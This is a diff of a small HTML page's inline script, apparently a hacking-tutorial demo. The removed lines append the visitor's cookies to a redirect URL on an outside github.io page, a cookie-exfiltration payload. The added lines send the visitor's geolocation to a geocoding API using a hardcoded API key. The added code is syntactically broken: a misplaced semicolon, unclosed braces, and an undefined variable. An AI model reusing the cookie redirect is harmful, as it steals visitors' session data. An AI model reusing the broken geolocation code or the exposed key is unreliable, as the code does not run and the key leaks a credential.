@@ -8,9 +8,20 @@
 </head>
 <body>
     <script type="text/javascript">
-        document.cookie = "username=Null Byte";
-        document.write(document.cookie);
-        document.location='https://hoodini.github.io/nb/nb2.html?c='+document.cookie;
+    
+        if (window.navigator.geolocation) { // Geolocation available
+			document.write("Geolocation available");
+                
+            const successfulLookup = position => {
+            const { latitude, longitude } = position.coords;
+            fetch(`https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=d1229ba7ddba435bbc6f8a4ede63826a`)
+              .then(response => response.json();
+              .then(console.log); // Or do whatever you want with the result
+
+            window.navigator.geolocation.getCurrentPosition(successfulLookup, console.log);
+            
+            console.log(results[0].formatted); // Gives something like '54, My street, My Town, My Post Code, My Country
+    	}
     </script>
 </body>
 </html>
